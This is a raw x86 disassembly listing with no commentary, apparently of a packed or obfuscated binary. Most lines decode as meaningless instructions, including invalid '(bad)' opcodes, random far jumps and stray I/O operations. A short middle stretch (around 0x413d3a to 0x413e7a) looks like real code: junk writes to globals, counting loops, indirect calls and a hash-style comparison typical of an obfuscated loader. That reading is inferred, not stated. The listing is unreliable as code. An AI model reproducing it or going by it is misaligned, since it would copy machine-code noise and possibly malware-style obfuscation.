  4137b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137b8:	and    al,0xe6
  4137ba:	jns    0x4137d1
  4137bc:	or     ah,0x1a
  4137bf:	aas    
  4137c0:	xlat   BYTE PTR ds:[ebx]
  4137c1:	mov    ebp,0xf24404bd
  4137c6:	jg     0x4137c5
  4137c8:	jge    0x413814
  4137ca:	mov    BYTE PTR [edi+0x1366350c],cl
  4137d0:	add    DWORD PTR [eax-0x4a],eax
  4137d3:	cli    
  4137d4:	inc    edx
  4137d5:	jno    0x413788
  4137d7:	test   DWORD PTR [ebp+ebx*8-0x12],0xbf1022ec
  4137df:	test   BYTE PTR [edi+0x3992cef9],bl
  4137e5:	cmp    al,BYTE PTR [ecx]
  4137e7:	cwde   
  4137e8:	stc    
  4137e9:	sti    
  4137ea:	enter  0x61c7,0x9e
  4137ee:	lahf   
  4137ef:	or     dl,ah
  4137f1:	mov    ds:0x4e802cac,eax
  4137f6:	dec    eax
  4137f7:	lock fisubr DWORD PTR [esi+0x5a318146]
  4137fe:	icebp  
  4137ff:	push   edx
  413800:	sbb    cl,BYTE PTR [eax-0x57]
  413803:	ret    
  413804:	(bad)  
  413805:	pop    edi
  413806:	inc    eax
  413807:	mov    edx,0x40555c00
  41380c:	nop
  41380d:	add    al,0xb3
  41380f:	mov    WORD PTR [eax-0x4],ss
  413812:	mov    edi,0xbd17432a
  413817:	mov    fs,WORD PTR [esi]
  413819:	sbb    dl,BYTE PTR [ebx+ebp*1-0x1e046d84]
  413820:	jmp    0x413833
  413822:	dec    ebp
  413823:	aas    
  413824:	adc    esp,DWORD PTR [edi-0x3cdb49b8]
  41382a:	stos   BYTE PTR es:[edi],al
  41382b:	mov    cl,0x53
  41382d:	int    0x20
  41382f:	lods   eax,DWORD PTR ds:[esi]
  413830:	inc    esp
  413831:	push   0x63
  413833:	add    ecx,DWORD PTR [ecx-0x714b10bc]
  413839:	mov    ecx,0xd1a1dc35
  41383e:	fld    DWORD PTR [eax]
  413840:	inc    edx
  413841:	ret    0x1d0
  413844:	(bad)  
  413845:	mov    esi,0x2ac83add
  41384a:	xchg   esp,eax
  41384b:	iret   
  41384c:	int3   
  41384d:	popf   
  41384e:	dec    BYTE PTR [edi+edi*8]
  413851:	adc    edi,DWORD PTR [edi]
  413853:	or     dh,BYTE PTR [eax-0x6ceda2e1]
  413859:	repnz or cl,BYTE PTR [eax+ecx*1+0x3a]
  41385e:	dec    esi
  41385f:	mov    esi,0x7b1651ff
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	or     eax,0x74c1063c
  41386a:	ret    
  41386b:	jle    0x413852
  41386d:	loop   0x41385e
  41386f:	and    eax,0x8a8e1b26
  413874:	icebp  
  413875:	sub    eax,0x596115f1
  41387a:	push   DWORD PTR [edx-0x56]
  41387d:	cmp    bl,dh
  41387f:	dec    edx
  413880:	mul    BYTE PTR [edi]
  413882:	mov    eax,ds:0x26badc05
  413887:	imul   edx,DWORD PTR [edi+ecx*8],0x58feac1a
  41388e:	repz inc esi
  413890:	les    esp,FWORD PTR [ecx]
  413892:	sahf   
  413893:	xchg   ebp,eax
  413894:	sbb    bx,WORD PTR [ebx-0x430d2f17]
  41389b:	pop    ebx
  41389c:	xchg   esi,eax
  41389d:	fwait
  41389e:	jmp    0x41391d
  4138a0:	push   esp
  4138a1:	call   0x2dba:0xfa16abf4
  4138a8:	je     0x4138e7
  4138aa:	sahf   
  4138ab:	loopne 0x413913
  4138ad:	sub    BYTE PTR [eax*2-0x21ed4e3a],dh
  4138b4:	or     cl,BYTE PTR [ecx+0x7a]
  4138b7:	in     eax,0xc9
  4138b9:	je     0x413901
  4138bb:	div    DWORD PTR [ecx+edi*8+0x64]
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	out    dx,eax
  4138c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138c2:	fimul  DWORD PTR [ebp-0x66]
  4138c5:	rcr    DWORD PTR ds:0x20ad0ce1,0x26
  4138cc:	xor    ecx,ebx
  4138ce:	push   edx
  4138cf:	gs or  al,0x27
  4138d2:	call   esi
  4138d4:	push   0xffffffa7
  4138d6:	dec    ebx
  4138d7:	cli    
  4138d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138d9:	push   esp
  4138da:	arpl   WORD PTR [esi-0x3c],bx
  4138dd:	fisttp DWORD PTR [edx]
  4138df:	gs neg bl
  4138e2:	sbb    dl,ch
  4138e4:	lods   al,BYTE PTR ds:[esi]
  4138e5:	shl    DWORD PTR [esi],1
  4138e7:	xor    eax,eax
  4138e9:	mov    ch,0xd5
  4138eb:	pusha  
  4138ec:	pop    eax
  4138ed:	mov    al,ds:0x9c2f0878
  4138f2:	jl     0x413944
  4138f4:	fdiv   st(3),st
  4138f6:	je     0x413879
  4138f8:	data16 and ch,BYTE PTR [eax+0x3d733aa2]
  4138ff:	inc    edi
  413900:	inc    esi
  413901:	in     al,0xa8
  413903:	les    edi,FWORD PTR [edx]
  413905:	inc    ebx
  413906:	cmp    eax,0x7c0292e
  41390b:	add    al,0x9d
  41390d:	mov    eax,0x4ff1745b
  413912:	(bad)  
  413913:	rol    BYTE PTR [edi],1
  413915:	push   ecx
  413916:	add    eax,0xd713cbde
  41391b:	lods   al,BYTE PTR ds:[esi]
  41391c:	adc    al,0x5
  41391e:	add    edi,esp
  413920:	int3   
  413921:	push   ecx
  413922:	fisttp QWORD PTR [edx+0x875be27]
  413928:	sub    cl,bl
  41392a:	out    0x98,eax
  41392c:	sub    ebx,ebp
  41392e:	in     al,dx
  41392f:	in     eax,dx
  413930:	push   ebp
  413931:	jne    0x413962
  413933:	sbb    al,0xea
  413935:	sbb    al,0x3
  413937:	retf   
  413938:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413939:	adc    esi,DWORD PTR [ebx-0x79]
  41393c:	push   esi
  41393d:	cmp    esp,eax
  41393f:	dec    esp
  413940:	jns    0x413995
  413942:	push   es
  413943:	aaa    
  413944:	fsub   st,st(4)
  413946:	adc    edx,DWORD PTR [eax-0x17bfb079]
  41394c:	je     0x4139a7
  41394e:	scas   al,BYTE PTR es:[edi]
  41394f:	mov    bh,0x21
  413951:	push   edi
  413952:	loopne 0x4138d7
  413954:	jae    0x41390d
  413956:	mov    al,0x9d
  413958:	and    bl,BYTE PTR [ebp+0x2e7bff23]
  41395e:	inc    ebx
  41395f:	outs   dx,BYTE PTR ds:[esi]
  413960:	loop   0x4139a4
  413962:	xchg   DWORD PTR [eax],eax
  413964:	jmp    0xa210:0x6b722ac5
  41396b:	and    dl,dl
  41396d:	loope  0x413971
  41396f:	mov    al,0xbe
  413971:	lahf   
  413972:	sbb    eax,DWORD PTR [esi-0xf]
  413975:	leave  
  413976:	mov    ds:0x80d6a9ba,eax
  41397b:	into   
  41397c:	mov    BYTE PTR [esi+0x11a75c77],dh
  413982:	out    0x76,eax
  413984:	ins    DWORD PTR es:[edi],dx
  413985:	aad    0xc5
  413987:	(bad)  
  413988:	dec    ebx
  413989:	ins    BYTE PTR es:[edi],dx
  41398a:	sti    
  41398b:	sbb    al,0x8b
  41398d:	push   ebp
  41398e:	out    0x44,eax
  413990:	fdiv   st(7),st
  413992:	cmp    edx,DWORD PTR [esi+0x2f]
  413995:	les    esp,FWORD PTR [edx]
  413997:	loop   0x41399a
  413999:	mov    cl,0x54
  41399b:	pop    es
  41399c:	and    al,0x70
  41399e:	inc    edi
  41399f:	out    dx,al
  4139a0:	(bad)  
  4139a1:	mov    esi,0xd1563e01
  4139a6:	push   0x6c
  4139a8:	mov    dh,0x5e
  4139aa:	add    eax,0x48777059
  4139af:	lahf   
  4139b0:	xlat   BYTE PTR ds:[ebx]
  4139b1:	out    dx,al
  4139b2:	sub    al,0xb
  4139b4:	jecxz  0x413969
  4139b6:	push   ecx
  4139b7:	or     ebx,edi
  4139b9:	(bad)  
  4139ba:	or     ebp,ebp
  4139bc:	mov    ds:0x84af1dd3,eax
  4139c1:	ins    DWORD PTR es:[edi],dx
  4139c2:	or     BYTE PTR [ecx],dh
  4139c4:	stc    
  4139c5:	xchg   esp,eax
  4139c6:	inc    esi
  4139c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4139c8:	daa    
  4139c9:	fistp  DWORD PTR [edi+eiz*4]
  4139cc:	dec    ebp
  4139cd:	call   0xc561de3e
  4139d2:	fnstsw WORD PTR gs:[ecx+0x4b]
  4139d6:	test   al,0xe4
  4139d8:	xlat   BYTE PTR ds:[ebx]
  4139d9:	push   eax
  4139da:	add    eax,0x700a3c27
  4139df:	sti    
  4139e0:	jbe    0x413a31
  4139e2:	push   edx
  4139e3:	popa   
  4139e4:	ins    DWORD PTR es:[edi],dx
  4139e5:	test   BYTE PTR [ebx-0x3284411d],0xf3
  4139ec:	sub    BYTE PTR [edx+ebp*1+0x17e00cde],0x15
  4139f4:	mov    al,ds:0x6a9dc588
  4139f9:	mov    esi,0x3bb44b2b
  4139fe:	cwde   
  4139ff:	or     DWORD PTR [ebx+0x52],edi
  413a02:	mov    ecx,0xa4cf7b1a
  413a07:	and    esp,DWORD PTR [ebx]
  413a09:	arpl   si,bp
  413a0b:	scas   al,BYTE PTR es:[edi]
  413a0c:	call   0x7f25:0x93a37c9
  413a13:	(bad)  
  413a14:	(bad)  
  413a15:	(bad)  
  413a16:	call   0x8e30975e
  413a1b:	(bad)  
  413a1c:	cld    
  413a1d:	mov    ebp,0x9c24b692
  413a22:	xor    al,ah
  413a24:	xchg   DWORD PTR [edx+esi*1+0x78a3df76],esp
  413a2b:	(bad)  
  413a2c:	out    0x48,eax
  413a2e:	push   ss
  413a2f:	nop
  413a30:	outs   dx,BYTE PTR ds:[esi]
  413a31:	dec    ebx
  413a32:	inc    esi
  413a33:	mov    esp,0xdd7a53d7
  413a38:	pop    ds
  413a39:	pop    eax
  413a3a:	xor    dl,BYTE PTR [edx-0x68]
  413a3d:	int    0xfe
  413a3f:	jmp    0x7e8d:0x3f945abe
  413a46:	les    ebp,FWORD PTR [ebp+0x55a337cd]
  413a4c:	cmp    al,dh
  413a4e:	repz mov esp,0xbd77e8bb
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	pop    es
  413a68:	mov    dh,0x17
  413a6a:	mov    edx,0x7070687e
  413a6f:	mov    ecx,0x2b70707e
  413a74:	iret   
  413a75:	cli    
  413a76:	xchg   ecx,eax
  413a77:	mov    ?,WORD PTR [ebp+0x21]
  413a7a:	(bad)  
  413a7b:	inc    ebp
  413a7c:	adc    dl,BYTE PTR [ebp-0x79a6ed24]
  413a82:	mov    ecx,0x7c34a6a6
  413a87:	fnstsw WORD PTR [ebp-0x79702f1f]
  413a8d:	jnp    0x413ade
  413a8f:	repnz mov bh,0xc4
  413a92:	pusha  
  413a93:	pop    ss
  413a94:	int    0x93
  413a96:	loope  0x413a26
  413a98:	in     al,0x5c
  413a9a:	cmp    al,BYTE PTR [ebx+0x1e8a3e3c]
  413aa0:	ret    0xd8ec
  413aa3:	push   eax
  413aa4:	mov    DWORD PTR [edi],eax
  413aa6:	xor    eax,0x93bed22e
  413aab:	ds (bad) 
  413aad:	xlat   BYTE PTR ds:[ebx]
  413aae:	inc    esp
  413aaf:	xchg   edi,eax
  413ab0:	jne    0x413a86
  413ab2:	ins    DWORD PTR es:[edi],dx
  413ab3:	and    eax,0x6b6c0db7
  413ab8:	out    0xe2,al
  413aba:	sbb    al,al
  413abc:	and    esp,DWORD PTR [ecx+eax*2+0x31996c58]
  413ac3:	pop    edi
  413ac4:	mov    cl,0xf6
  413ac6:	xchg   ecx,eax
  413ac7:	mov    WORD PTR [ebp+0x472d297c],ds
  413acd:	mov    bl,0x7b
  413acf:	div    DWORD PTR [esp+ebx*1-0x7e9dd5aa]
  413ad6:	mov    ecx,0xca134ef1
  413adb:	adc    BYTE PTR ds:0x23d8fe0d,0x55
  413ae2:	les    ebx,FWORD PTR [edx-0x1d9a97b4]
  413ae8:	out    0x9,al
  413aea:	add    edx,DWORD PTR [esi-0x715e59a1]
  413af0:	pop    edx
  413af1:	xchg   BYTE PTR [ecx],bh
  413af3:	jp     0x413a8d
  413af5:	cwde   
  413af6:	clc    
  413af7:	addr16 stc 
  413af9:	xchg   esp,eax
  413afa:	pop    ebx
  413afb:	or     al,BYTE PTR [ebx]
  413afd:	test   BYTE PTR [ebx],cl
  413aff:	inc    edi
  413b00:	xor    edi,DWORD PTR [edi-0x6cb48a17]
  413b06:	jo     0x413ae4
  413b08:	xor    ah,BYTE PTR [eax]
  413b0a:	mov    cl,0x73
  413b0c:	add    ah,BYTE PTR [edx-0x48]
  413b0f:	push   0x427f6be7
  413b14:	dec    ebp
  413b15:	and    DWORD PTR [edx-0xe893426],edx
  413b1b:	out    dx,al
  413b1c:	ficomp DWORD PTR [ebx+0x7d]
  413b1f:	pop    ecx
  413b20:	clc    
  413b21:	fiadd  WORD PTR [eax-0x3e]
  413b24:	iret   
  413b25:	pop    edx
  413b26:	jae    0x413ab3
  413b28:	xchg   ch,ch
  413b2a:	inc    ebp
  413b2b:	mov    ah,0x19
  413b2d:	sub    eax,0x305fee31
  413b32:	mul    BYTE PTR ds:0xaed511f6
  413b38:	sub    al,0x4f
  413b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b3b:	push   0x63
  413b3d:	in     al,dx
  413b3e:	mov    eax,DWORD PTR [edi-0x2c60ff]
  413b44:	dec    edi
  413b45:	icebp  
  413b46:	pop    ecx
  413b47:	pop    ss
  413b48:	adc    eax,0x85b57794
  413b4d:	pop    ecx
  413b4e:	adc    bh,al
  413b50:	mov    eax,0x91caa15e
  413b55:	cli    
  413b56:	add    BYTE PTR [ebp+0x0],bl
  413b59:	fcomi  st,st(6)
  413b5b:	and    eax,0x9a83faa2
  413b60:	push   ss
  413b61:	mov    eax,0x8b0ab1d7
  413b66:	in     eax,0x73
  413b68:	xor    edx,DWORD PTR [eax]
  413b6a:	jmp    0x1930:0xc224a86
  413b71:	cmp    ch,BYTE PTR [edx-0x30]
  413b74:	xchg   esp,eax
  413b75:	mov    ds:0xce387629,al
  413b7a:	jmp    0xf97dab6e
  413b7f:	and    al,0xc2
  413b81:	inc    esp
  413b82:	(bad)  
  413b83:	push   cs
  413b84:	ficomp DWORD PTR [ebx+0x70e4acc4]
  413b8a:	xchg   DWORD PTR [eax],ebp
  413b8c:	fs pop eax
  413b8e:	mov    ah,0xe9
  413b90:	cs mov al,0xce
  413b93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b94:	daa    
  413b95:	shl    BYTE PTR [ebp-0x3ed89591],cl
  413b9b:	sti    
  413b9c:	loope  0x413b87
  413b9e:	call   0x52856727
  413ba3:	out    0xad,al
  413ba5:	pop    ebp
  413ba6:	cmp    eax,0x2d65b0a3
  413bab:	push   cs
  413bac:	push   ss
  413bad:	lea    eax,[ecx+0x5c436f15]
  413bb3:	adc    eax,0x87dc1992
  413bb8:	lahf   
  413bb9:	lock add DWORD PTR [ecx+0x4c],ebp
  413bbd:	and    ebx,eax
  413bbf:	(bad)  
  413bc0:	mov    ch,0x7e
  413bc2:	ret    
  413bc3:	idiv   ebx
  413bc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bc6:	in     al,0x1e
  413bc8:	scas   al,BYTE PTR es:[edi]
  413bc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413bca:	jecxz  0x413c23
  413bcc:	leave  
  413bcd:	retf   
  413bce:	pop    esi
  413bcf:	push   cs
  413bd0:	test   DWORD PTR [edi+0x7ab41fd9],ebx
  413bd6:	cwde   
  413bd7:	(bad)  
  413bd8:	in     eax,0xd2
  413bda:	mov    dl,BYTE PTR [esi-0x14]
  413bdd:	add    dl,BYTE PTR [edi+0x4a39a58b]
  413be3:	repnz mov ds:0x96bf0279,al
  413be9:	popa   
  413bea:	cdq    
  413beb:	jle    0x413c27
  413bed:	cli    
  413bee:	xor    al,0x90
  413bf0:	mov    bl,0x14
  413bf2:	mov    eax,0x7a6d089f
  413bf7:	fdivr  QWORD PTR [esi-0x31]
  413bfa:	push   0xffffff83
  413bfc:	scas   al,BYTE PTR es:[edi]
  413bfd:	sbb    DWORD PTR [eax],eax
  413bff:	and    dl,BYTE PTR [eax-0x1f]
  413c02:	test   eax,0xdfc91b67
  413c07:	ret    0xa396
  413c0a:	mov    BYTE PTR [ecx-0x44],0xf6
  413c0e:	adc    cl,BYTE PTR [edi]
  413c10:	popf   
  413c11:	fs jne 0x413c1c
  413c14:	xchg   ebx,eax
  413c15:	ins    BYTE PTR es:[edi],dx
  413c16:	and    DWORD PTR [edx+0x6c],edx
  413c19:	mov    eax,0x6b91af42
  413c1e:	shl    BYTE PTR [edx],0xcc
  413c21:	inc    esi
  413c22:	int    0x82
  413c24:	sub    al,0x8f
  413c26:	push   es
  413c27:	pop    edx
  413c28:	dec    edi
  413c29:	mov    esp,0xe7a05db4
  413c2e:	call   FWORD PTR [ebx]
  413c30:	xchg   ecx,eax
  413c31:	jb     0x413cac
  413c33:	add    DWORD PTR [edx-0x75342fb7],ebx
  413c39:	cli    
  413c3a:	gs cdq 
  413c3c:	add    esp,DWORD PTR [ebp+0xf]
  413c3f:	clc    
  413c40:	mov    esi,0xcaee2a6f
  413c45:	cmc    
  413c46:	(bad)  
  413c47:	ins    BYTE PTR es:[edi],dx
  413c48:	outs   dx,BYTE PTR ds:[esi]
  413c49:	mov    dl,0xce
  413c4b:	addr16 jnp 0x413cbd
  413c4e:	or     bh,dl
  413c50:	fsubr  DWORD PTR [edx+edx*4-0x6c]
  413c54:	fist   WORD PTR [esp+edi*2+0x452fcc7a]
  413c5b:	mov    ecx,0x7b3ae86d
  413c60:	sub    al,0xdc
  413c62:	mov    bl,0x5a
  413c64:	push   0x4b
  413c66:	pop    edx
  413c67:	adc    DWORD PTR [ebp+0x568bfe9e],esp
  413c6d:	in     eax,dx
  413c6e:	ror    DWORD PTR [ebp+0x1de2df92],1
  413c74:	mov    esi,0x31cb26e6
  413c79:	dec    eax
  413c7a:	cmp    ebp,esi
  413c7c:	sub    eax,0xf86fffe7
  413c81:	inc    ecx
  413c82:	add    eax,0x4f723909
  413c87:	ins    DWORD PTR es:[edi],dx
  413c88:	push   ecx
  413c89:	mov    esi,0x7925aced
  413c8e:	sbb    dh,BYTE PTR [esi+0x57]
  413c91:	mov    eax,0x9279e280
  413c96:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413c98:	loop   0x413c58
  413c9a:	jae    0x413cbe
  413c9c:	sbb    ah,cl
  413c9e:	outs   dx,BYTE PTR ds:[esi]
  413c9f:	loope  0x413c37
  413ca1:	dec    edi
  413ca2:	jae    0x413c51
  413ca4:	mov    al,ds:0x5fbb97d4
  413ca9:	jge    0x413c2c
  413cab:	xor    al,BYTE PTR ds:0x31640852
  413cb1:	and    edx,DWORD PTR [ebx]
  413cb3:	data16 mov dl,0x31
  413cb6:	cld    
  413cb7:	jnp    0x413c44
  413cb9:	stos   DWORD PTR es:[edi],eax
  413cba:	push   edi
  413cbc:	jmp    0xaeac1129
  413cc1:	and    BYTE PTR [esi+0x5c],bl
  413cc4:	test   eax,0x545b6a9
  413cc9:	push   ss
  413cca:	push   cs
  413ccb:	xchg   esi,eax
  413ccc:	mov    eax,ds:0xe9ad3bb6
  413cd1:	and    eax,0x892945ab
  413cd6:	add    ah,BYTE PTR [eax-0x5d]
  413cd9:	xchg   esp,eax
  413cda:	jo     0x413cbc
  413cdc:	lods   eax,DWORD PTR ds:[esi]
  413cdd:	imul   edi,DWORD PTR [edx],0x42
  413ce0:	fstp   QWORD PTR [eax]
  413ce2:	shl    DWORD PTR [ecx+0x365a5cb6],0xa0
  413ce9:	sbb    BYTE PTR [edi+0x46],ah
  413cec:	sub    ah,BYTE PTR [ebx-0x2f1c5320]
  413cf2:	ret    0x760d
  413cf5:	test   eax,0x7d12304f
  413cfa:	pusha  
  413cfb:	sbb    eax,0x605857a4
  413d00:	(bad)  
  413d01:	xchg   ebx,eax
  413d02:	mov    BYTE PTR [edx],dh
  413d04:	jl     0x413c95
  413d06:	pop    es
  413d07:	ins    DWORD PTR es:[edi],dx
  413d08:	jb     0x413c9d
  413d0a:	jns    0x413c8e
  413d0c:	or     eax,0x6ec94bbf
  413d11:	adc    dh,bh
  413d13:	sub    DWORD PTR [ebp+0x23],edi
  413d16:	mov    ch,0x3c
  413d18:	fisubr WORD PTR [ebp+0x5a]
  413d1b:	ud2    
  413d1d:	push   ecx
  413d1e:	jp     0x413d31
  413d20:	lods   eax,DWORD PTR ds:[esi]
  413d21:	jle    0x413d04
  413d23:	mov    edi,0xb24713af
  413d28:	cmp    ebx,DWORD PTR [eax]
  413d2a:	je     0x413cc3
  413d2c:	mov    ecx,0x6990513d
  413d31:	adc    ebp,DWORD PTR [edx]
  413d33:	mov    WORD PTR [edi-0x13],gs
  413d36:	(bad)  
  413d37:	jg     0x413d43
  413d39:	sahf   
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e7ff,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e7ff,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e7ff,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e66b
  413d7f:	cmp    DWORD PTR ds:0x42e7ff,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e7ff
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e7ff,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e7ff
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e7ff,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e80f,0x42fe86
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e22c,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e7f7
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fdd9,0x42e220
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e7fb,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e7fb
  413e02:	inc    eax
  413e03:	mov    ds:0x42e7fb,eax
  413e08:	cmp    DWORD PTR ds:0x42e7fb,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e7fb,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e58b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fe01,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e7f7,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe8a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e803
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e21c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e7fb,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	push   ebx
  413e8c:	mov    esi,0x7647f4d2
  413e91:	jo     0x413f03
  413e93:	mov    ecx,0x7370707e
  413e98:	in     al,0x41
  413e9a:	sbb    esp,DWORD PTR [eax]
  413e9c:	hlt    
  413e9d:	mov    ch,0x22
  413e9f:	addr16 icebp 
  413ea1:	adc    cl,BYTE PTR [esi+0x68]
  413ea4:	lods   al,BYTE PTR ds:[esi]
  413ea5:	repz xor al,BYTE PTR [edx-0x32]
  413ea9:	and    esi,edi
  413eab:	sbb    bh,al
  413ead:	jbe    0x413e3c
  413eaf:	mov    ch,BYTE PTR ds:0x4df3e7ca
  413eb5:	cwde   
  413eb6:	call   0x7a2cd69b
  413ebb:	pop    ebx
  413ebc:	gs mov al,0x2d
  413ebf:	stos   DWORD PTR es:[edi],eax
  413ec0:	lds    ecx,FWORD PTR [edi-0x57]
  413ec3:	ret    
  413ec4:	shl    BYTE PTR ds:0xaba2a675,0x79
  413ecb:	dec    ecx
  413ecc:	inc    edi
  413ecd:	add    eax,0xf878eb13
  413ed2:	cmp    eax,0x92548142
  413ed7:	repnz retf 
  413ed9:	arpl   WORD PTR [eax],dx
  413edb:	cmp    esi,ebx
  413edd:	push   edi
  413ede:	out    0x13,eax
  413ee0:	(bad)  
  413ee1:	adc    ch,BYTE PTR [edi]
  413ee3:	pop    ebp
  413ee4:	mov    ch,0x12
  413ee6:	je     0x413ebc
  413ee8:	adc    ecx,DWORD PTR [edi-0x4db1cfd0]
  413eee:	fimul  DWORD PTR [eax-0x63f87aa8]
  413ef4:	xor    BYTE PTR ds:[ebp-0x41],bh
  413ef8:	cmp    DWORD PTR [edx+0x3e654426],esi
  413efe:	mul    BYTE PTR [esi]
  413f00:	dec    ecx
  413f01:	fild   WORD PTR [edx-0x33433f70]
  413f07:	add    eax,ecx
  413f09:	push   esp
  413f0a:	cmp    eax,0xa37f21e6
  413f0f:	xchg   edx,eax
  413f10:	xchg   edi,eax
  413f11:	sbb    eax,0x6cdbb69b
  413f16:	jl     0x413f67
  413f18:	mov    edi,0x5d91f703
  413f1d:	or     bh,BYTE PTR [edi]
  413f1f:	jmp    0xa592da6d
  413f24:	sbb    bh,ah
  413f26:	jge    0x413f52
  413f28:	jns    0x413f74
  413f2a:	inc    ebx
  413f2b:	inc    ecx
  413f2c:	mov    esp,DWORD PTR [eax]
  413f2e:	xchg   ebp,eax
  413f2f:	retf   0xe44b
  413f32:	cmp    al,0xd1
  413f34:	mov    ebp,esi
  413f36:	iret   
  413f37:	and    eax,0xc8342cbb
  413f3c:	(bad)  
  413f3e:	fwait
  413f3f:	push   cs
  413f40:	or     al,BYTE PTR ds:0x4dcabaa0
  413f46:	rcr    DWORD PTR [eax-0x48],0x47
  413f4a:	out    0x6e,al
  413f4c:	dec    ebp
  413f4d:	(bad)  
  413f4e:	and    eax,0xe0f3570d
  413f53:	add    eax,0x2a2e1658
  413f58:	inc    esi
  413f59:	xor    al,0xf6
  413f5b:	mov    ah,BYTE PTR [edx-0x1d26a6d5]
  413f61:	ret    0x2eaa
  413f64:	sahf   
  413f65:	aam    0x88
  413f67:	jle    0x413fa6
  413f69:	cdq    
  413f6a:	jo     0x413f4d
  413f6c:	dec    eax
  413f6d:	imul   edi,ebp,0xc99919ff
  413f73:	aas    
  413f74:	call   0xf0cf4c6
  413f79:	and    al,0x55
  413f7b:	xchg   edx,eax
  413f7c:	aam    0x96
  413f7e:	arpl   WORD PTR [edi+0x41193534],bp
  413f84:	mov    dl,0x57
  413f86:	cmp    cl,BYTE PTR [ebx-0x9]
  413f89:	fs add al,0xa7
  413f8c:	jns    0x413fdc
  413f8e:	xchg   al,al
  413f90:	pop    edi
  413f91:	imul   esp,DWORD PTR [edi+ecx*1+0x7d3cc3a5],0xa0c0828f
  413f9c:	and    BYTE PTR [esi*8+0x207bf70d],al
  413fa3:	std    
  413fa4:	dec    edi
  413fa5:	pop    edx
  413fa6:	mov    BYTE PTR [esi+ecx*2-0x37],0x1b
  413fab:	push   ebx
  413fac:	inc    eax
  413fad:	mov    bh,0xe0
  413faf:	xor    BYTE PTR [ebp+0x37da7407],ch
  413fb5:	fwait
  413fb6:	or     eax,0x8bebf79d
  413fbb:	cmp    cl,bh
  413fbd:	test   al,0x50
  413fbf:	mov    bl,0x25
  413fc1:	into   
  413fc2:	push   edi
  413fc3:	push   0x62
  413fc5:	pop    esi
  413fc6:	cwde   
  413fc7:	test   ah,dl
  413fc9:	sbb    dl,dl
  413fcb:	jl     0x413fa0
  413fcd:	retf   0xa450
  413fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fd1:	data16 jo 0x414037
  413fd4:	mov    bh,0x77
  413fd6:	fiadd  WORD PTR [esi-0x7a44c9ad]
  413fdc:	mov    dh,0xb5
  413fde:	push   0xfce69dc8
  413fe3:	xor    eax,0x76dbf04b
  413fe8:	pop    esi
  413fe9:	xor    al,0xcd
  413feb:	push   ss
  413fec:	lahf   
  413fed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fee:	ror    DWORD PTR [ecx+0x78],1
